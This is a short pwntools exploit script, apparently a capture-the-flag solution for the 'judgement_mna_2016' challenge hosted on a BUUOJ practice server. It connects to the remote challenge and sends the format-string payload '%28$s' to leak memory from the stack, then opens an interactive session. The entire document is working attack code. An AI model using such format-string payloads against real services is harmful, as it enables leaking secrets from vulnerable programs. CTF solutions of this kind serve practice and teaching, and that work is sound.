from pwn import *


# p = process("./judgement_mna_2016")
p = remote("node4.buuoj.cn", 29967)

pad = "%28$s"
p.sendline(pad)

p.interactive()


